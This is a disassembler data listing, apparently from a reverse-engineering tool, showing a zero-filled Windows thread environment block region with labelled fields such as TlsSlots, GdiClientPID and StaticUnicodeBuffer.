        ffdff35c 00              ??         00h
        ffdff35d 00              ??         00h
        ffdff35e 00              ??         00h
        ffdff35f 00              ??         00h
        ffdff360 00              ??         00h
        ffdff361 00              ??         00h
        ffdff362 00              ??         00h
        ffdff363 00              ??         00h
        ffdff364 00              ??         00h
        ffdff365 00              ??         00h
        ffdff366 00              ??         00h
        ffdff367 00              ??         00h
        ffdff368 00              ??         00h
        ffdff369 00              ??         00h
        ffdff36a 00              ??         00h
        ffdff36b 00              ??         00h
        ffdff36c 00              ??         00h
        ffdff36d 00              ??         00h
        ffdff36e 00              ??         00h
        ffdff36f 00              ??         00h
        ffdff370 00              ??         00h
        ffdff371 00              ??         00h
        ffdff372 00              ??         00h
        ffdff373 00              ??         00h
        ffdff374 00              ??         00h
        ffdff375 00              ??         00h
        ffdff376 00              ??         00h
        ffdff377 00              ??         00h
        ffdff378 00              ??         00h
        ffdff379 00              ??         00h
        ffdff37a 00              ??         00h
        ffdff37b 00              ??         00h
        ffdff37c 00              ??         00h
        ffdff37d 00              ??         00h
        ffdff37e 00              ??         00h
        ffdff37f 00              ??         00h
        ffdff380 00              ??         00h
        ffdff381 00              ??         00h
        ffdff382 00              ??         00h
        ffdff383 00              ??         00h
        ffdff384 00              ??         00h
        ffdff385 00              ??         00h
        ffdff386 00              ??         00h
        ffdff387 00              ??         00h
        ffdff388 00              ??         00h
        ffdff389 00              ??         00h
        ffdff38a 00              ??         00h
        ffdff38b 00              ??         00h
        ffdff38c 00              ??         00h
        ffdff38d 00              ??         00h
        ffdff38e 00              ??         00h
        ffdff38f 00              ??         00h
        ffdff390 00              ??         00h
        ffdff391 00              ??         00h
        ffdff392 00              ??         00h
        ffdff393 00              ??         00h
        ffdff394 00              ??         00h
        ffdff395 00              ??         00h
        ffdff396 00              ??         00h
        ffdff397 00              ??         00h
        ffdff398 00              ??         00h
        ffdff399 00              ??         00h
        ffdff39a 00              ??         00h
        ffdff39b 00              ??         00h
        ffdff39c 00              ??         00h
        ffdff39d 00              ??         00h
        ffdff39e 00              ??         00h
        ffdff39f 00              ??         00h
        ffdff3a0 00              ??         00h
        ffdff3a1 00              ??         00h
        ffdff3a2 00              ??         00h
        ffdff3a3 00              ??         00h
        ffdff3a4 00              ??         00h
        ffdff3a5 00              ??         00h
        ffdff3a6 00              ??         00h
        ffdff3a7 00              ??         00h
        ffdff3a8 00              ??         00h
        ffdff3a9 00              ??         00h
        ffdff3aa 00              ??         00h
        ffdff3ab 00              ??         00h
        ffdff3ac 00              ??         00h
        ffdff3ad 00              ??         00h
        ffdff3ae 00              ??         00h
        ffdff3af 00              ??         00h
        ffdff3b0 00              ??         00h
        ffdff3b1 00              ??         00h
        ffdff3b2 00              ??         00h
        ffdff3b3 00              ??         00h
        ffdff3b4 00              ??         00h
        ffdff3b5 00              ??         00h
        ffdff3b6 00              ??         00h
        ffdff3b7 00              ??         00h
        ffdff3b8 00              ??         00h
        ffdff3b9 00              ??         00h
        ffdff3ba 00              ??         00h
        ffdff3bb 00              ??         00h
        ffdff3bc 00              ??         00h
        ffdff3bd 00              ??         00h
        ffdff3be 00              ??         00h
        ffdff3bf 00              ??         00h
        ffdff3c0 00              ??         00h
        ffdff3c1 00              ??         00h
        ffdff3c2 00              ??         00h
        ffdff3c3 00              ??         00h
        ffdff3c4 00              ??         00h
        ffdff3c5 00              ??         00h
        ffdff3c6 00              ??         00h
        ffdff3c7 00              ??         00h
        ffdff3c8 00              ??         00h
        ffdff3c9 00              ??         00h
        ffdff3ca 00              ??         00h
        ffdff3cb 00              ??         00h
        ffdff3cc 00              ??         00h
        ffdff3cd 00              ??         00h
        ffdff3ce 00              ??         00h
        ffdff3cf 00              ??         00h
        ffdff3d0 00              ??         00h
        ffdff3d1 00              ??         00h
        ffdff3d2 00              ??         00h
        ffdff3d3 00              ??         00h
        ffdff3d4 00              ??         00h
        ffdff3d5 00              ??         00h
        ffdff3d6 00              ??         00h
        ffdff3d7 00              ??         00h
        ffdff3d8 00              ??         00h
        ffdff3d9 00              ??         00h
        ffdff3da 00              ??         00h
        ffdff3db 00              ??         00h
        ffdff3dc 00              ??         00h
        ffdff3dd 00              ??         00h
        ffdff3de 00              ??         00h
        ffdff3df 00              ??         00h
        ffdff3e0 00              ??         00h
        ffdff3e1 00              ??         00h
        ffdff3e2 00              ??         00h
        ffdff3e3 00              ??         00h
        ffdff3e4 00              ??         00h
        ffdff3e5 00              ??         00h
        ffdff3e6 00              ??         00h
        ffdff3e7 00              ??         00h
        ffdff3e8 00              ??         00h
        ffdff3e9 00              ??         00h
        ffdff3ea 00              ??         00h
        ffdff3eb 00              ??         00h
        ffdff3ec 00              ??         00h
        ffdff3ed 00              ??         00h
        ffdff3ee 00              ??         00h
        ffdff3ef 00              ??         00h
        ffdff3f0 00              ??         00h
        ffdff3f1 00              ??         00h
        ffdff3f2 00              ??         00h
        ffdff3f3 00              ??         00h
        ffdff3f4 00              ??         00h
        ffdff3f5 00              ??         00h
        ffdff3f6 00              ??         00h
        ffdff3f7 00              ??         00h
        ffdff3f8 00              ??         00h
        ffdff3f9 00              ??         00h
        ffdff3fa 00              ??         00h
        ffdff3fb 00              ??         00h
        ffdff3fc 00              ??         00h
        ffdff3fd 00              ??         00h
        ffdff3fe 00              ??         00h
        ffdff3ff 00              ??         00h
        ffdff400 00              ??         00h
        ffdff401 00              ??         00h
        ffdff402 00              ??         00h
        ffdff403 00              ??         00h
        ffdff404 00              ??         00h
        ffdff405 00              ??         00h
        ffdff406 00              ??         00h
        ffdff407 00              ??         00h
        ffdff408 00              ??         00h
        ffdff409 00              ??         00h
        ffdff40a 00              ??         00h
        ffdff40b 00              ??         00h
        ffdff40c 00              ??         00h
        ffdff40d 00              ??         00h
        ffdff40e 00              ??         00h
        ffdff40f 00              ??         00h
        ffdff410 00              ??         00h
        ffdff411 00              ??         00h
        ffdff412 00              ??         00h
        ffdff413 00              ??         00h
        ffdff414 00              ??         00h
        ffdff415 00              ??         00h
        ffdff416 00              ??         00h
        ffdff417 00              ??         00h
        ffdff418 00              ??         00h
        ffdff419 00              ??         00h
        ffdff41a 00              ??         00h
        ffdff41b 00              ??         00h
        ffdff41c 00              ??         00h
        ffdff41d 00              ??         00h
        ffdff41e 00              ??         00h
        ffdff41f 00              ??         00h
        ffdff420 00              ??         00h
        ffdff421 00              ??         00h
        ffdff422 00              ??         00h
        ffdff423 00              ??         00h
        ffdff424 00              ??         00h
        ffdff425 00              ??         00h
        ffdff426 00              ??         00h
        ffdff427 00              ??         00h
        ffdff428 00              ??         00h
        ffdff429 00              ??         00h
        ffdff42a 00              ??         00h
        ffdff42b 00              ??         00h
        ffdff42c 00              ??         00h
        ffdff42d 00              ??         00h
        ffdff42e 00              ??         00h
        ffdff42f 00              ??         00h
        ffdff430 00              ??         00h
        ffdff431 00              ??         00h
        ffdff432 00              ??         00h
        ffdff433 00              ??         00h
        ffdff434 00              ??         00h
        ffdff435 00              ??         00h
        ffdff436 00              ??         00h
        ffdff437 00              ??         00h
        ffdff438 00              ??         00h
        ffdff439 00              ??         00h
        ffdff43a 00              ??         00h
        ffdff43b 00              ??         00h
        ffdff43c 00              ??         00h
        ffdff43d 00              ??         00h
        ffdff43e 00              ??         00h
        ffdff43f 00              ??         00h
        ffdff440 00              ??         00h
        ffdff441 00              ??         00h
        ffdff442 00              ??         00h
        ffdff443 00              ??         00h
        ffdff444 00              ??         00h
        ffdff445 00              ??         00h
        ffdff446 00              ??         00h
        ffdff447 00              ??         00h
        ffdff448 00              ??         00h
        ffdff449 00              ??         00h
        ffdff44a 00              ??         00h
        ffdff44b 00              ??         00h
        ffdff44c 00              ??         00h
        ffdff44d 00              ??         00h
        ffdff44e 00              ??         00h
        ffdff44f 00              ??         00h
        ffdff450 00              ??         00h
        ffdff451 00              ??         00h
        ffdff452 00              ??         00h
        ffdff453 00              ??         00h
        ffdff454 00              ??         00h
        ffdff455 00              ??         00h
        ffdff456 00              ??         00h
        ffdff457 00              ??         00h
        ffdff458 00              ??         00h
        ffdff459 00              ??         00h
        ffdff45a 00              ??         00h
        ffdff45b 00              ??         00h
        ffdff45c 00              ??         00h
        ffdff45d 00              ??         00h
        ffdff45e 00              ??         00h
        ffdff45f 00              ??         00h
        ffdff460 00              ??         00h
        ffdff461 00              ??         00h
        ffdff462 00              ??         00h
        ffdff463 00              ??         00h
        ffdff464 00              ??         00h
        ffdff465 00              ??         00h
        ffdff466 00              ??         00h
        ffdff467 00              ??         00h
        ffdff468 00              ??         00h
        ffdff469 00              ??         00h
        ffdff46a 00              ??         00h
        ffdff46b 00              ??         00h
        ffdff46c 00              ??         00h
        ffdff46d 00              ??         00h
        ffdff46e 00              ??         00h
        ffdff46f 00              ??         00h
        ffdff470 00              ??         00h
        ffdff471 00              ??         00h
        ffdff472 00              ??         00h
        ffdff473 00              ??         00h
        ffdff474 00              ??         00h
        ffdff475 00              ??         00h
        ffdff476 00              ??         00h
        ffdff477 00              ??         00h
        ffdff478 00              ??         00h
        ffdff479 00              ??         00h
        ffdff47a 00              ??         00h
        ffdff47b 00              ??         00h
        ffdff47c 00              ??         00h
        ffdff47d 00              ??         00h
        ffdff47e 00              ??         00h
        ffdff47f 00              ??         00h
        ffdff480 00              ??         00h
        ffdff481 00              ??         00h
        ffdff482 00              ??         00h
        ffdff483 00              ??         00h
        ffdff484 00              ??         00h
        ffdff485 00              ??         00h
        ffdff486 00              ??         00h
        ffdff487 00              ??         00h
        ffdff488 00              ??         00h
        ffdff489 00              ??         00h
        ffdff48a 00              ??         00h
        ffdff48b 00              ??         00h
        ffdff48c 00              ??         00h
        ffdff48d 00              ??         00h
        ffdff48e 00              ??         00h
        ffdff48f 00              ??         00h
        ffdff490 00              ??         00h
        ffdff491 00              ??         00h
        ffdff492 00              ??         00h
        ffdff493 00              ??         00h
        ffdff494 00              ??         00h
        ffdff495 00              ??         00h
        ffdff496 00              ??         00h
        ffdff497 00              ??         00h
        ffdff498 00              ??         00h
        ffdff499 00              ??         00h
        ffdff49a 00              ??         00h
        ffdff49b 00              ??         00h
        ffdff49c 00              ??         00h
        ffdff49d 00              ??         00h
        ffdff49e 00              ??         00h
        ffdff49f 00              ??         00h
        ffdff4a0 00              ??         00h
        ffdff4a1 00              ??         00h
        ffdff4a2 00              ??         00h
        ffdff4a3 00              ??         00h
        ffdff4a4 00              ??         00h
        ffdff4a5 00              ??         00h
        ffdff4a6 00              ??         00h
        ffdff4a7 00              ??         00h
        ffdff4a8 00              ??         00h
        ffdff4a9 00              ??         00h
        ffdff4aa 00              ??         00h
        ffdff4ab 00              ??         00h
        ffdff4ac 00              ??         00h
        ffdff4ad 00              ??         00h
        ffdff4ae 00              ??         00h
        ffdff4af 00              ??         00h
        ffdff4b0 00              ??         00h
        ffdff4b1 00              ??         00h
        ffdff4b2 00              ??         00h
        ffdff4b3 00              ??         00h
        ffdff4b4 00              ??         00h
        ffdff4b5 00              ??         00h
        ffdff4b6 00              ??         00h
        ffdff4b7 00              ??         00h
        ffdff4b8 00              ??         00h
        ffdff4b9 00              ??         00h
        ffdff4ba 00              ??         00h
        ffdff4bb 00              ??         00h
        ffdff4bc 00              ??         00h
        ffdff4bd 00              ??         00h
        ffdff4be 00              ??         00h
        ffdff4bf 00              ??         00h
        ffdff4c0 00              ??         00h
        ffdff4c1 00              ??         00h
        ffdff4c2 00              ??         00h
        ffdff4c3 00              ??         00h
        ffdff4c4 00              ??         00h
        ffdff4c5 00              ??         00h
        ffdff4c6 00              ??         00h
        ffdff4c7 00              ??         00h
        ffdff4c8 00              ??         00h
        ffdff4c9 00              ??         00h
        ffdff4ca 00              ??         00h
        ffdff4cb 00              ??         00h
        ffdff4cc 00              ??         00h
        ffdff4cd 00              ??         00h
        ffdff4ce 00              ??         00h
        ffdff4cf 00              ??         00h
        ffdff4d0 00              ??         00h
        ffdff4d1 00              ??         00h
        ffdff4d2 00              ??         00h
        ffdff4d3 00              ??         00h
        ffdff4d4 00              ??         00h
        ffdff4d5 00              ??         00h
        ffdff4d6 00              ??         00h
        ffdff4d7 00              ??         00h
        ffdff4d8 00              ??         00h
        ffdff4d9 00              ??         00h
        ffdff4da 00              ??         00h
        ffdff4db 00              ??         00h
        ffdff4dc 00              ??         00h
        ffdff4dd 00              ??         00h
        ffdff4de 00              ??         00h
        ffdff4df 00              ??         00h
        ffdff4e0 00              ??         00h
        ffdff4e1 00              ??         00h
        ffdff4e2 00              ??         00h
        ffdff4e3 00              ??         00h
        ffdff4e4 00              ??         00h
        ffdff4e5 00              ??         00h
        ffdff4e6 00              ??         00h
        ffdff4e7 00              ??         00h
        ffdff4e8 00              ??         00h
        ffdff4e9 00              ??         00h
        ffdff4ea 00              ??         00h
        ffdff4eb 00              ??         00h
        ffdff4ec 00              ??         00h
        ffdff4ed 00              ??         00h
        ffdff4ee 00              ??         00h
        ffdff4ef 00              ??         00h
        ffdff4f0 00              ??         00h
        ffdff4f1 00              ??         00h
        ffdff4f2 00              ??         00h
        ffdff4f3 00              ??         00h
        ffdff4f4 00              ??         00h
        ffdff4f5 00              ??         00h
        ffdff4f6 00              ??         00h
        ffdff4f7 00              ??         00h
        ffdff4f8 00              ??         00h
        ffdff4f9 00              ??         00h
        ffdff4fa 00              ??         00h
        ffdff4fb 00              ??         00h
        ffdff4fc 00              ??         00h
        ffdff4fd 00              ??         00h
        ffdff4fe 00              ??         00h
        ffdff4ff 00              ??         00h
        ffdff500 00              ??         00h
        ffdff501 00              ??         00h
        ffdff502 00              ??         00h
        ffdff503 00              ??         00h
        ffdff504 00              ??         00h
        ffdff505 00              ??         00h
        ffdff506 00              ??         00h
        ffdff507 00              ??         00h
        ffdff508 00              ??         00h
        ffdff509 00              ??         00h
        ffdff50a 00              ??         00h
        ffdff50b 00              ??         00h
        ffdff50c 00              ??         00h
        ffdff50d 00              ??         00h
        ffdff50e 00              ??         00h
        ffdff50f 00              ??         00h
        ffdff510 00              ??         00h
        ffdff511 00              ??         00h
        ffdff512 00              ??         00h
        ffdff513 00              ??         00h
        ffdff514 00              ??         00h
        ffdff515 00              ??         00h
        ffdff516 00              ??         00h
        ffdff517 00              ??         00h
        ffdff518 00              ??         00h
        ffdff519 00              ??         00h
        ffdff51a 00              ??         00h
        ffdff51b 00              ??         00h
        ffdff51c 00              ??         00h
        ffdff51d 00              ??         00h
        ffdff51e 00              ??         00h
        ffdff51f 00              ??         00h
        ffdff520 00              ??         00h
        ffdff521 00              ??         00h
        ffdff522 00              ??         00h
        ffdff523 00              ??         00h
        ffdff524 00              ??         00h
        ffdff525 00              ??         00h
        ffdff526 00              ??         00h
        ffdff527 00              ??         00h
        ffdff528 00              ??         00h
        ffdff529 00              ??         00h
        ffdff52a 00              ??         00h
        ffdff52b 00              ??         00h
        ffdff52c 00              ??         00h
        ffdff52d 00              ??         00h
        ffdff52e 00              ??         00h
        ffdff52f 00              ??         00h
        ffdff530 00              ??         00h
        ffdff531 00              ??         00h
        ffdff532 00              ??         00h
        ffdff533 00              ??         00h
        ffdff534 00              ??         00h
        ffdff535 00              ??         00h
        ffdff536 00              ??         00h
        ffdff537 00              ??         00h
        ffdff538 00              ??         00h
        ffdff539 00              ??         00h
        ffdff53a 00              ??         00h
        ffdff53b 00              ??         00h
        ffdff53c 00              ??         00h
        ffdff53d 00              ??         00h
        ffdff53e 00              ??         00h
        ffdff53f 00              ??         00h
        ffdff540 00              ??         00h
        ffdff541 00              ??         00h
        ffdff542 00              ??         00h
        ffdff543 00              ??         00h
        ffdff544 00              ??         00h
        ffdff545 00              ??         00h
        ffdff546 00              ??         00h
        ffdff547 00              ??         00h
        ffdff548 00              ??         00h
        ffdff549 00              ??         00h
        ffdff54a 00              ??         00h
        ffdff54b 00              ??         00h
        ffdff54c 00              ??         00h
        ffdff54d 00              ??         00h
        ffdff54e 00              ??         00h
        ffdff54f 00              ??         00h
        ffdff550 00              ??         00h
        ffdff551 00              ??         00h
        ffdff552 00              ??         00h
        ffdff553 00              ??         00h
        ffdff554 00              ??         00h
        ffdff555 00              ??         00h
        ffdff556 00              ??         00h
        ffdff557 00              ??         00h
        ffdff558 00              ??         00h
        ffdff559 00              ??         00h
        ffdff55a 00              ??         00h
        ffdff55b 00              ??         00h
        ffdff55c 00              ??         00h
        ffdff55d 00              ??         00h
        ffdff55e 00              ??         00h
        ffdff55f 00              ??         00h
        ffdff560 00              ??         00h
        ffdff561 00              ??         00h
        ffdff562 00              ??         00h
        ffdff563 00              ??         00h
        ffdff564 00              ??         00h
        ffdff565 00              ??         00h
        ffdff566 00              ??         00h
        ffdff567 00              ??         00h
        ffdff568 00              ??         00h
        ffdff569 00              ??         00h
        ffdff56a 00              ??         00h
        ffdff56b 00              ??         00h
        ffdff56c 00              ??         00h
        ffdff56d 00              ??         00h
        ffdff56e 00              ??         00h
        ffdff56f 00              ??         00h
        ffdff570 00              ??         00h
        ffdff571 00              ??         00h
        ffdff572 00              ??         00h
        ffdff573 00              ??         00h
        ffdff574 00              ??         00h
        ffdff575 00              ??         00h
        ffdff576 00              ??         00h
        ffdff577 00              ??         00h
        ffdff578 00              ??         00h
        ffdff579 00              ??         00h
        ffdff57a 00              ??         00h
        ffdff57b 00              ??         00h
        ffdff57c 00              ??         00h
        ffdff57d 00              ??         00h
        ffdff57e 00              ??         00h
        ffdff57f 00              ??         00h
        ffdff580 00              ??         00h
        ffdff581 00              ??         00h
        ffdff582 00              ??         00h
        ffdff583 00              ??         00h
        ffdff584 00              ??         00h
        ffdff585 00              ??         00h
        ffdff586 00              ??         00h
        ffdff587 00              ??         00h
        ffdff588 00              ??         00h
        ffdff589 00              ??         00h
        ffdff58a 00              ??         00h
        ffdff58b 00              ??         00h
        ffdff58c 00              ??         00h
        ffdff58d 00              ??         00h
        ffdff58e 00              ??         00h
        ffdff58f 00              ??         00h
        ffdff590 00              ??         00h
        ffdff591 00              ??         00h
        ffdff592 00              ??         00h
        ffdff593 00              ??         00h
        ffdff594 00              ??         00h
        ffdff595 00              ??         00h
        ffdff596 00              ??         00h
        ffdff597 00              ??         00h
        ffdff598 00              ??         00h
        ffdff599 00              ??         00h
        ffdff59a 00              ??         00h
        ffdff59b 00              ??         00h
        ffdff59c 00              ??         00h
        ffdff59d 00              ??         00h
        ffdff59e 00              ??         00h
        ffdff59f 00              ??         00h
        ffdff5a0 00              ??         00h
        ffdff5a1 00              ??         00h
        ffdff5a2 00              ??         00h
        ffdff5a3 00              ??         00h
        ffdff5a4 00              ??         00h
        ffdff5a5 00              ??         00h
        ffdff5a6 00              ??         00h
        ffdff5a7 00              ??         00h
        ffdff5a8 00              ??         00h
        ffdff5a9 00              ??         00h
        ffdff5aa 00              ??         00h
        ffdff5ab 00              ??         00h
        ffdff5ac 00              ??         00h
        ffdff5ad 00              ??         00h
        ffdff5ae 00              ??         00h
        ffdff5af 00              ??         00h
        ffdff5b0 00              ??         00h
        ffdff5b1 00              ??         00h
        ffdff5b2 00              ??         00h
        ffdff5b3 00              ??         00h
        ffdff5b4 00              ??         00h
        ffdff5b5 00              ??         00h
        ffdff5b6 00              ??         00h
        ffdff5b7 00              ??         00h
        ffdff5b8 00              ??         00h
        ffdff5b9 00              ??         00h
        ffdff5ba 00              ??         00h
        ffdff5bb 00              ??         00h
        ffdff5bc 00              ??         00h
        ffdff5bd 00              ??         00h
        ffdff5be 00              ??         00h
        ffdff5bf 00              ??         00h
        ffdff5c0 00              ??         00h
        ffdff5c1 00              ??         00h
        ffdff5c2 00              ??         00h
        ffdff5c3 00              ??         00h
        ffdff5c4 00              ??         00h
        ffdff5c5 00              ??         00h
        ffdff5c6 00              ??         00h
        ffdff5c7 00              ??         00h
        ffdff5c8 00              ??         00h
        ffdff5c9 00              ??         00h
        ffdff5ca 00              ??         00h
        ffdff5cb 00              ??         00h
        ffdff5cc 00              ??         00h
        ffdff5cd 00              ??         00h
        ffdff5ce 00              ??         00h
        ffdff5cf 00              ??         00h
        ffdff5d0 00              ??         00h
        ffdff5d1 00              ??         00h
        ffdff5d2 00              ??         00h
        ffdff5d3 00              ??         00h
        ffdff5d4 00              ??         00h
        ffdff5d5 00              ??         00h
        ffdff5d6 00              ??         00h
        ffdff5d7 00              ??         00h
        ffdff5d8 00              ??         00h
        ffdff5d9 00              ??         00h
        ffdff5da 00              ??         00h
        ffdff5db 00              ??         00h
        ffdff5dc 00              ??         00h
        ffdff5dd 00              ??         00h
        ffdff5de 00              ??         00h
        ffdff5df 00              ??         00h
        ffdff5e0 00              ??         00h
        ffdff5e1 00              ??         00h
        ffdff5e2 00              ??         00h
        ffdff5e3 00              ??         00h
        ffdff5e4 00              ??         00h
        ffdff5e5 00              ??         00h
        ffdff5e6 00              ??         00h
        ffdff5e7 00              ??         00h
        ffdff5e8 00              ??         00h
        ffdff5e9 00              ??         00h
        ffdff5ea 00              ??         00h
        ffdff5eb 00              ??         00h
        ffdff5ec 00              ??         00h
        ffdff5ed 00              ??         00h
        ffdff5ee 00              ??         00h
        ffdff5ef 00              ??         00h
        ffdff5f0 00              ??         00h
        ffdff5f1 00              ??         00h
        ffdff5f2 00              ??         00h
        ffdff5f3 00              ??         00h
        ffdff5f4 00              ??         00h
        ffdff5f5 00              ??         00h
        ffdff5f6 00              ??         00h
        ffdff5f7 00              ??         00h
        ffdff5f8 00              ??         00h
        ffdff5f9 00              ??         00h
        ffdff5fa 00              ??         00h
        ffdff5fb 00              ??         00h
        ffdff5fc 00              ??         00h
        ffdff5fd 00              ??         00h
        ffdff5fe 00              ??         00h
        ffdff5ff 00              ??         00h
        ffdff600 00              ??         00h
        ffdff601 00              ??         00h
        ffdff602 00              ??         00h
        ffdff603 00              ??         00h
        ffdff604 00              ??         00h
        ffdff605 00              ??         00h
        ffdff606 00              ??         00h
        ffdff607 00              ??         00h
        ffdff608 00              ??         00h
        ffdff609 00              ??         00h
        ffdff60a 00              ??         00h
        ffdff60b 00              ??         00h
        ffdff60c 00              ??         00h
        ffdff60d 00              ??         00h
        ffdff60e 00              ??         00h
        ffdff60f 00              ??         00h
        ffdff610 00              ??         00h
        ffdff611 00              ??         00h
        ffdff612 00              ??         00h
        ffdff613 00              ??         00h
        ffdff614 00              ??         00h
        ffdff615 00              ??         00h
        ffdff616 00              ??         00h
        ffdff617 00              ??         00h
        ffdff618 00              ??         00h
        ffdff619 00              ??         00h
        ffdff61a 00              ??         00h
        ffdff61b 00              ??         00h
        ffdff61c 00              ??         00h
        ffdff61d 00              ??         00h
        ffdff61e 00              ??         00h
        ffdff61f 00              ??         00h
        ffdff620 00              ??         00h
        ffdff621 00              ??         00h
        ffdff622 00              ??         00h
        ffdff623 00              ??         00h
        ffdff624 00              ??         00h
        ffdff625 00              ??         00h
        ffdff626 00              ??         00h
        ffdff627 00              ??         00h
        ffdff628 00              ??         00h
        ffdff629 00              ??         00h
        ffdff62a 00              ??         00h
        ffdff62b 00              ??         00h
        ffdff62c 00              ??         00h
        ffdff62d 00              ??         00h
        ffdff62e 00              ??         00h
        ffdff62f 00              ??         00h
        ffdff630 00              ??         00h
        ffdff631 00              ??         00h
        ffdff632 00              ??         00h
        ffdff633 00              ??         00h
        ffdff634 00              ??         00h
        ffdff635 00              ??         00h
        ffdff636 00              ??         00h
        ffdff637 00              ??         00h
        ffdff638 00              ??         00h
        ffdff639 00              ??         00h
        ffdff63a 00              ??         00h
        ffdff63b 00              ??         00h
        ffdff63c 00              ??         00h
        ffdff63d 00              ??         00h
        ffdff63e 00              ??         00h
        ffdff63f 00              ??         00h
        ffdff640 00              ??         00h
        ffdff641 00              ??         00h
        ffdff642 00              ??         00h
        ffdff643 00              ??         00h
        ffdff644 00              ??         00h
        ffdff645 00              ??         00h
        ffdff646 00              ??         00h
        ffdff647 00              ??         00h
        ffdff648 00              ??         00h
        ffdff649 00              ??         00h
        ffdff64a 00              ??         00h
        ffdff64b 00              ??         00h
        ffdff64c 00              ??         00h
        ffdff64d 00              ??         00h
        ffdff64e 00              ??         00h
        ffdff64f 00              ??         00h
        ffdff650 00              ??         00h
        ffdff651 00              ??         00h
        ffdff652 00              ??         00h
        ffdff653 00              ??         00h
        ffdff654 00              ??         00h
        ffdff655 00              ??         00h
        ffdff656 00              ??         00h
        ffdff657 00              ??         00h
        ffdff658 00              ??         00h
        ffdff659 00              ??         00h
        ffdff65a 00              ??         00h
        ffdff65b 00              ??         00h
        ffdff65c 00              ??         00h
        ffdff65d 00              ??         00h
        ffdff65e 00              ??         00h
        ffdff65f 00              ??         00h
        ffdff660 00              ??         00h
        ffdff661 00              ??         00h
        ffdff662 00              ??         00h
        ffdff663 00              ??         00h
        ffdff664 00              ??         00h
        ffdff665 00              ??         00h
        ffdff666 00              ??         00h
        ffdff667 00              ??         00h
        ffdff668 00              ??         00h
        ffdff669 00              ??         00h
        ffdff66a 00              ??         00h
        ffdff66b 00              ??         00h
        ffdff66c 00              ??         00h
        ffdff66d 00              ??         00h
        ffdff66e 00              ??         00h
        ffdff66f 00              ??         00h
        ffdff670 00              ??         00h
        ffdff671 00              ??         00h
        ffdff672 00              ??         00h
        ffdff673 00              ??         00h
        ffdff674 00              ??         00h
        ffdff675 00              ??         00h
        ffdff676 00              ??         00h
        ffdff677 00              ??         00h
        ffdff678 00              ??         00h
        ffdff679 00              ??         00h
        ffdff67a 00              ??         00h
        ffdff67b 00              ??         00h
        ffdff67c 00              ??         00h
        ffdff67d 00              ??         00h
        ffdff67e 00              ??         00h
        ffdff67f 00              ??         00h
        ffdff680 00              ??         00h
        ffdff681 00              ??         00h
        ffdff682 00              ??         00h
        ffdff683 00              ??         00h
        ffdff684 00              ??         00h
        ffdff685 00              ??         00h
        ffdff686 00              ??         00h
        ffdff687 00              ??         00h
        ffdff688 00              ??         00h
        ffdff689 00              ??         00h
        ffdff68a 00              ??         00h
        ffdff68b 00              ??         00h
        ffdff68c 00              ??         00h
        ffdff68d 00              ??         00h
        ffdff68e 00              ??         00h
        ffdff68f 00              ??         00h
        ffdff690 00              ??         00h
        ffdff691 00              ??         00h
        ffdff692 00              ??         00h
        ffdff693 00              ??         00h
        ffdff694 00              ??         00h
        ffdff695 00              ??         00h
        ffdff696 00              ??         00h
        ffdff697 00              ??         00h
        ffdff698 00              ??         00h
        ffdff699 00              ??         00h
        ffdff69a 00              ??         00h
        ffdff69b 00              ??         00h
        ffdff69c 00              ??         00h
        ffdff69d 00              ??         00h
        ffdff69e 00              ??         00h
        ffdff69f 00              ??         00h
        ffdff6a0 00              ??         00h
        ffdff6a1 00              ??         00h
        ffdff6a2 00              ??         00h
        ffdff6a3 00              ??         00h
        ffdff6a4 00              ??         00h
        ffdff6a5 00              ??         00h
        ffdff6a6 00              ??         00h
        ffdff6a7 00              ??         00h
        ffdff6a8 00              ??         00h
        ffdff6a9 00              ??         00h
        ffdff6aa 00              ??         00h
        ffdff6ab 00              ??         00h
        ffdff6ac 00              ??         00h
        ffdff6ad 00              ??         00h
        ffdff6ae 00              ??         00h
        ffdff6af 00              ??         00h
        ffdff6b0 00              ??         00h
        ffdff6b1 00              ??         00h
        ffdff6b2 00              ??         00h
        ffdff6b3 00              ??         00h
                             RealClientId
        ffdff6b4 00 00 00        CLIENT_ID
                 00 00 00
                 00 00
                             GdiCachedProcessHandle
        ffdff6bc 00 00 00 00     void *     00000000
                             GdiClientPID
        ffdff6c0 00 00 00 00     ddw        0h
                             GdiCLientTID
        ffdff6c4 00 00 00 00     ddw        0h
                             GdiThreadLocalInfo
        ffdff6c8 00 00 00 00     void *     00000000
                             Win32ClientInfo
        ffdff6cc 00 00 00        void *[62]
                 00 00 00
                 00 00 00
                             glDispatchTable
        ffdff7c4 00 00 00        void *[2
                 00 00 00
                 00 00 00
                             glReserved1
        ffdffb68 00 00 00        void *[29]
                 00 00 00
                 00 00 00
                             glReserved2
        ffdffbdc 00 00 00 00     void *     00000000
                             glSectionInfo
        ffdffbe0 00 00 00 00     void *     00000000
                             glSection
        ffdffbe4 00 00 00 00     void *     00000000
                             glTable
        ffdffbe8 00 00 00 00     void *     00000000
                             glCurrentRC
        ffdffbec 00 00 00 00     void *     00000000
                             glContext
        ffdffbf0 00 00 00 00     void *     00000000
                             LastStatusValue
        ffdffbf4 00 00 00 00     ddw        0h
        ffdffbf8 00              ??         00h
        ffdffbf9 00              ??         00h
        ffdffbfa 00              ??         00h
        ffdffbfb 00              ??         00h
        ffdffbfc 00              ??         00h
        ffdffbfd 00              ??         00h
        ffdffbfe 00              ??         00h
        ffdffbff 00              ??         00h
                             StaticUnicodeBuffer
        ffdffc00 00 00 00        wchar16[   u""
                 00 00 00
                 00 00 00
        ffdffe0a 00              ??         00h
        ffdffe0b 00              ??         00h
                             DeallocationStack
        ffdffe0c 00 00 00 00     void *     00000000
                             TlsSlots
        ffdffe10 00 00 00        void *[64]
                 00 00 00
                 00 00 00
                             TlsLinks.Flink
        ffdfff10 00 00 00 00     void *     00000000
                             TlsLinks.Blink
        ffdfff14 00 00 00 00     void *     00000000
                             Vdm
        ffdfff18 00 00 00 00     void *     00000000
                             ReservedForNtRpc
        ffdfff1c 00 00 00 00     void *     00000000
                             DbgSsReserved
        ffdfff20 00 00 00        void *[2]
                 00 00 00
                 00 00
                             HardErrorMode
        ffdfff28 00 00 00 00     ddw        0h
                             Instrumentation
        ffdfff2c 00 00 00        void *[9]
                 00 00 00
                 00 00 00
                             ActivityId
        ffdfff50 00 00 00        GUID       00000000-0000-0000-0000-000000000000
                 00 00 00
                 00 00 00
                             SubProcessTag
        ffdfff60 00 00 00 00     void *     00000000
                             EtwLocalData
        ffdfff64 00 00 00 00     void *     00000000
                             EtwTraceData
        ffdfff68 00 00 00 00     void *     00000000
                             WinSockData
        ffdfff6c 00 00 00 00     void *     00000000
                             GdiBatchCount
        ffdfff70 00 00 00 00     ddw        0h
